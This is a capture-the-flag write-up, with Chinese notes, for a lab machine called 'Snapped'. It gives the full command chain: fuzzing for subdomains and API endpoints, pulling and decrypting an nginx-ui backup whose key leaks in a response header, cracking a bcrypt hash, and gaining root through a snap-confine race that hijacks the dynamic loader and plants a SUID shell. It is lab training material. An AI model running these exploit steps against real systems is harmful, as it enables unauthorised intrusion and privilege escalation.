#### FORM Snapped
<details>
<summary>目录枚举 | /login 请求会调用 /api/install | zip加密数据</summary>

```
---------------------------------------------------------------------------------
//加密数据 data 需要 openssl 解密
接口 /api/backup ：一个 zip 备份文件
				  一个 header：X-Backup-Security: key:iv
base64 解码 →  转 hex → 用 openssl aes-256-cbc 解密

$ openssl enc -aes-256-cbc -d \
-in nginx-ui.zip \
-out nginxui_decrypted.zip \
-K 571734b9... \
-iv 897f39...
---------------------------------------------------------------------------------
//子域名的解析
[★]$ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
-u http://snapped.htb \
-H "Host: FUZZ.snapped.htb" \
-fs 0
---------------------------------------------------------------------------------
//在Login | Ngunx UI页面 -> file:install -> Headers: GET -> Scheme:http Host: admin.snapped.htb Fileame: /api/install
//对 /api 端点进行模糊测试
[★]$ ffuf -w /usr//wordlists/dirbuster/directory-list-2.3-small.txt -u http://admin.snapped.htb/api/FUZZ -ic
...<SNIP>...
config                  [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 11ms]
backup                  [Status: 200, Size: 18354, Words: 86, Lines: 64, Duration: 60ms]
settings                [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 17ms]
licenses                [Status: 200, Size: 52782, Words: 9, Lines: 1, Duration: 58ms]
...</SNIP>...
//403 和 200 同时出现 → 很可能存在权限控制点（有价值）
---------------------------------------------------------------------------------
[★]$ curl -v http://admin.snapped.htb/api/backup

< Content-Disposition: attachment; filename=backup-20260408-051614.zip  <----

< X-Backup-Security: u22Nc23m2OgIlYmBtRQwP8VL/pU3IOdzYJ59woAZv/8=:eIthO679S62WMoMLwSDVkg==  <----
<
---------------------------------------------------------------------------------
//Nginx-ui 版本 2.3.2 存在 CVE-2026-27944 这一漏洞
[★]$ wget https://raw.githubusercontent.com/NULL200OK/-nginxui_discover/refs/heads/main/nginxui_discover.py
[★]$ python3 nginxui_discover.py --target http://admin.snapped.htb
[★]$ curl -OJ -v http://admin.snapped.htb/api/backup  //-O 按远程文件名保存；-J 使用服务器返回的文件名
< Content-Disposition: attachment; filename=backup-20260408-052459.zip

< X-Backup-Security: Vxc0uRonbp1SeuSBOALRDvKaOKNpN81YXpHcF0SFjcw=:iX85sm7XYqhjH777ZRe5bA==
< 
[★]$ ls
backup-20260408-052459.zip
---------------------------------------------------------------------------------
//分别从 base64 格式中对两者进行解码，然后将其转换为十六进制字符串
[★]$ key=$(echo 'Vxc0uRonbp1SeuSBOALRDvKaOKNpN81YXpHcF0SFjcw=' | base64 -d | xxd -p -c 256)
[★]$ echo $key
571734b91a276e9d527ae4813802d10ef29a38a36937cd585e91dc1744858dcc

[★]$ iv=$(echo 'iX85sm7XYqhjH777ZRe5bA==' | base64 -d | xxd -p)
[★]$ echo $iv
897f39b26ed762a8631fbefb6517b96c
---------------------------------------------------------------------------------
[★]$ unzip -d backup backup-20260408-052459.zip
Archive:  backup-20260408-052459.zip
  inflating: backup/hash_info.txt    
  inflating: backup/nginx-ui.zip     <---
  inflating: backup/nginx.zip
---------------------------------------------------------------------------------
[~/backup][★]$ openssl enc -aes-256-cbc -d -in nginx-ui.zip -out nginxui_decrypted.zip -K 571734b91a276e9d527ae4813802d10ef29a38a36937cd585e91dc1744858dcc -iv 897f39b26ed762a8631fbefb6517b96c

[~/backup][★]$ ls
hash_info.txt  nginx-ui.zip  nginx.zip  ngixui_decrypted.zip
---------------------------------------------------------------------------------
[~/backup][★]$ unzip ngixui_decrypted.zip
Archive:  ngixui_decrypted.zip
  inflating: app.ini                 
  inflating: database.db
---------------------------------------------------------------------------------
[★]$ sqlite3 database.db
sqlite> .tables

sqlite> select * from users;
04:00||jonathan|$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq|1||,��զ�H�։��e)5U��Z��KĦ"D���W�|en
---------------------------------------------------------------------------------
[~/backup][★]$ echo '$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq' > hash
[~/backup][★]$ cp /usr/share/wordlists/rockyou.txt.gz .
[~/backup][★]$ gunzip rockyou.txt.gz
[~/backup][★]$ hashcat -m 3200  hash rockyou.txt
---------------------------------------------------------------------------------
```
</details>

<details>
<summary>snap-confine二进制文件 && snap沙盒环境</summary>
	
```
---------------------------------------------------------------------------------
Ubuntu 24.04 系统中，snap-confine 是一个 SUID-root 二进制文件，它会在任何 snap 运行之前构建沙盒环境
jonathan@snapped:~$ snap --version
snap    2.63.1+24.04
---------------------------------------------------------------------------------
//上传2个文件
[★]$ wget https://raw.githubusercontent.com/nomaisthere/CVE-2026-3888/refs/heads/main/src/firefox_2404.c
[★]$ wget https://raw.githubusercontent.com/nomaisthere/CVE-2026-3888/refs/heads/main/src/librootshell.c
[★]$ gcc -O2 -static -o firefox_2404 firefox_2404.c
[★]$ gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell.c
[★]$ scp firefox_2404  librootshell.so jonathan@10.129.20.138:/home/jonathan
---------------------------------------------------------------------------------
//snap-confine命令的可执行 && 执行路径/tmp 1777
jonathan@snapped:~$ ls -la /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 159016 Aug 20  2024 /usr/lib/snapd/snap-confine
jonathan@snapped:~$ cat /usr/lib/tmpfiles.d/tmp.conf
D /tmp 1777 root root 4m
#q /var/tmp 1777 root root 30d
jonathan@snapped:~$ cat /usr/lib/tmpfiles.d/snapd.conf
D! /tmp/snap-private-tmp 0700 root root -
---------------------------------------------------------------------------------
// /usr/lib/x86_64-linux-gnu 目录下 控制该命名空间中的每一个共享库——包括动态链接器本身（ld-linux-x86-64.so.2）
// TOCTOU 代表Time-Of-Check to Time-Of-Use（检查时间到使用时间）
// $ mkdir -p .snap/usr/lib/x86_64-linux-gnu.exchange
---------------------------------------------------------------------------------
Terminal 1
jonathan@snapped:~$ systemd-run --user --scope --unit=snap.init$(date +%s) \
  env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
  --base core22 snap.firefox.hook.configure /bin/bash
Running as unit: snap.init1776156713.scope; invocation ID: 533040603f9444328c1b81bf9362a8fd

jonathan@snapped:/home/jonathan$ cd /tmp
jonathan@snapped:/tmp$ stat ./.snap
  File: ./.snap
  Size: 4096      	Blocks: 8          IO Block: 4096   directory
Device: fc00h/64512d	Inode: 261852      Links: 4
Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)

jonathan@snapped:/tmp$ echo $$
3260
jonathan@snapped:/tmp$ while test -d ./.snap; do touch ./; sleep 1; done //现在要保持/tmp活跃，同时摒弃.snap陈旧观念
//等待它会删除 .X11-unix .snap
---------------------------------------------------------------------------------
Terminal 2
jonathan@snapped:/proc/3260/cwd$ ls -la
total 4
drwxrwxrwt  2 root root 4096 Apr 15 08:08 .
drwxr-xr-x 21 root root  540 Apr 15 08:04 ..
jonathan@snapped:/proc/3260/cwd$ mkdir -p .snap/usr/lib/x86_64-linux-gnu.exchange		//很重要的一步
jonathan@snapped:/proc/3260/cwd$ ls -la
total 8
drwxrwxrwt  3 root     root     4096 Apr 15 08:09 .
drwxr-xr-x 21 root     root      540 Apr 15 08:04 ..
drwxrwxr-x  3 jonathan jonathan 4096 Apr 15 08:09 .snap
//预期的错误，为了保留/tmp其下的目录
jonathan@snapped:/proc/3260/cwd$ systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash -c \
  "env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
  --base snapd snap.firefox.hook.configure /nonexistent; exit"
Running as unit: snap.d1776255002.scope; invocation ID: adbde2af581f402ea085e2bf395021f4
cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_swHqfq//dev: No such file or directory

jonathan@snapped:/proc/3260/cwd$ ~/firefox_2404 ~/librootshell.so
---------------------------------------------------------------------------------
Terminal 3
jonathan@snapped:/proc/3260/cwd$ ls -al
total 20
drwxrwxrwt  4 root     root     4096 Apr 15 08:10 .
drwxr-xr-x 21 root     root      540 Apr 15 08:04 ..
-rw-rw-r--  1 jonathan jonathan   30 Apr 15 08:10 race_perms.txt
-rw-rw-r--  1 jonathan jonathan    5 Apr 15 08:10 race_pid.txt
drwxrwxr-x  4 jonathan jonathan 4096 Apr 15 08:10 .snap
drwxr-xr-x  2 root     root     4096 Apr 15 08:10 .X11-unix

jonathan@snapped:~$ PID=$(cat /proc/3260/cwd/race_pid.txt)
jonathan@snapped:~$ echo "$PID"
4178
jonathan@snapped:~$ cd /proc/$PID/root
jonathan@snapped:/proc/4178/root$ stat -c '%U:%G %a' usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
jonathan:jonathan 755

jonathan@snapped:/proc/4178/root$ cp /usr/bin/busybox ./tmp/sh
jonathan@snapped:/proc/4178/root$ cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2

jonathan@snapped:/proc/4178/root$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine  --base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine

BusyBox v1.36.1 (Ubuntu 1:1.36.1-6ubuntu3.1) built-in shell (ash)
Enter 'help' for a list of built-in commands.

/ # id
uid=0(root) gid=1000(jonathan) groups=1000(jonathan)
/ # cp /bin/bash /var/snap/firefox/common/bash
/ # chmod 04755 /var/snap/firefox/common/bash
/ # exit

jonathan@snapped:~$ /var/snap/firefox/common/bash -p
bash-5.1# id
uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)

bash-5.1# cat /root/root.txt
---------------------------------------------------------------------------------
```
</details>

---------------------------------------------------------------------------------
